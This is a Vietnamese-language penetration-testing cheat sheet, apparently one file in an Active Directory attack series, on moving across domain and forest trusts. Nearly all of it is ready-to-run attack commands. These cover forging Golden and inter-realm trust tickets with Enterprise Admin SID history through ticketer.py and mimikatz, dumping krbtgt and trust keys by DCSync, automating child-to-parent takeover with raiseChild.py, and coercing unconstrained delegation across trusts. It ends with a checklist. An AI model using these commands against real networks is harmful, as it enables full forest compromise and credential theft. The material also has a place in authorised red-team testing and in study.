# 13 — Trusts (quan hệ tin cậy giữa domain/forest)

**Trạng thái:** đã kiểm soát một domain; còn domain/forest khác. **Mục tiêu:**
nhảy sang domain khác. Nhánh "Trusts" của mindmap.

---

## A. Enumerate trusts

```bash
nltest.exe /trusted_domains
sharphound.exe -c trusts -d <domain>
ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> trusts
```

```powershell
Get-DomainTrust -Domain <domain>
Get-DomainTrustMapping
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```

```cypher
MATCH p=(:Domain)-[:TrustedBy]->(:Domain) RETURN p
```

### Get Domain SID

```powershell
Get-DomainSID -Domain <domain>
```

```bash
lookupsid.py -domain-sids '<domain>/<user>:<password>'@<target_dc> 0
```

- **Kết quả:** biết hướng trust (1 chiều/2 chiều, transitive) và SID các domain.

---

## B. Child → Parent (nội forest) — SID History / ExtraSIDs

> **Khi nào:** là DA của **child domain**; có `krbtgt` của child.
> **Tại sao:** ranh giới bảo mật là **forest**; thêm SID của Enterprise Admins
> (`<RootDomainSID>-519`) vào ticket → chiếm forest root. Không bị SID filter nội forest.

```bash
# Lấy krbtgt child (DCSync) rồi tạo Golden có extra-sid
secretsdump.py -just-dc-user '<parent_domain>$' <domain>/<user>:<password>@<dc_ip>
ticketer.py -nthash <child_krbtgt_hash> -domain-sid <child_sid> -domain <child_domain> \
   -extra-sid <parent_sid>-519 goldenuser
ticketer.py -nthash <trust_key> -domain-sid <child_sid> -domain <child_domain> \
   -extra-sid <parent_sid>-519 -spn krbtgt/<parent_domain> trustfakeuser
# Tự động hoá
raiseChild.py <child_domain>/<user>:<password>
```

```powershell
mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-519 /krbtgt:<HASH_KRBTGT> /ptt
mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt
```

- **Kết quả:** DA trên forest root → PtT → DCSync parent.

---

## C. Parent → Child

> Mindmap: "same as Child to parent". Cùng kỹ thuật SID History theo hướng xuống
> (ít giá trị vì parent đã trùm child).

---

## D. Trust Key / Trust Ticket (giữa 2 domain)

> **Khi nào:** có inter-realm trust key (DCSync `-just-dc-user '<domain>$'`).
> **Tại sao:** tạo inter-realm TGT để truy cập domain tin cậy.

```bash
secretsdump.py -just-dc-user '<domainB>' <domainA>/<user>:'<password>'@<dc_a>
# Tạo trust ticket với SID History
ticketer.py -nthash <trust_hash> -domain-sid <sid_a> -domain <domain_a> \
   -extra-sid <domain_b_sid>-<group_sid sup 1000> -spn krbtgt/<domain_a> fakeuser
```

```powershell
mimikatz lsadump::trust /patch
mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /sids:<target_domain_sid>-519 /service:krbtgt /target:<target_domain> /rc4:<trust_key> /ptt
```

---

## E. External Trust / Forest Trust

> Mindmap vẽ các kịch bản theo hướng & loại (FOREST_TRANSITIVE, TREAT_AS_EXTERNAL):
- **DomainA ↔ DomainB (hai chiều):** như "double trust" — nếu có unconstrained
  delegation, coerce chéo DC.
- **DomainA ← DomainB (B trust A / A access B):** như double trust nhưng B không
  kết nối A được (không unconstrained về A).
- **DomainA → DomainB (A trust B / B access A):** thường **password reuse / lat
  move** giữa 2 domain.
- **from A to B FOREST_TRANSITIVE:** dùng SID History với
  `<RootDomainSID>-<GROUP_SID_SUP_1000>` (chỉ nhóm SID > 1000 mới qua được SID filter forest).

```powershell
# Golden ticket cross-forest (nhóm SID >1000)
mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-<GROUP_SID_SUP_1000> /ptt
```

### Unconstrained delegation xuyên trust (box mindmap)

- child_dc coerce parent_dc trên unconstrained → lấy TGT parent DC.
- coerce dc_b trên dc_a qua unconstrained → lấy TGT dc_a.

---

## F. MSSQL trusted links (bỏ qua trust AD)

> MSSQL linked server **không quan tâm trust AD** → đường tắt sang domain khác.
> Xem [file 11 §F](11-mssql.md): `use_link`, `sp_linkedservers`, `trustlink`.

---

## Checklist Trusts

- [ ] Enum trust (nltest / Get-DomainTrust / sharphound -c trusts)
- [ ] Lấy SID các domain
- [ ] Child→Parent: krbtgt child + extra-sid `<root>-519` (hoặc raiseChild.py)
- [ ] Trust key (DCSync `<domain>$`) → trust ticket
- [ ] Forest: chỉ SID >1000 qua được SID filter
- [ ] MSSQL linked server xuyên trust
- [ ] Mỗi domain mới → lặp lại file 01→12
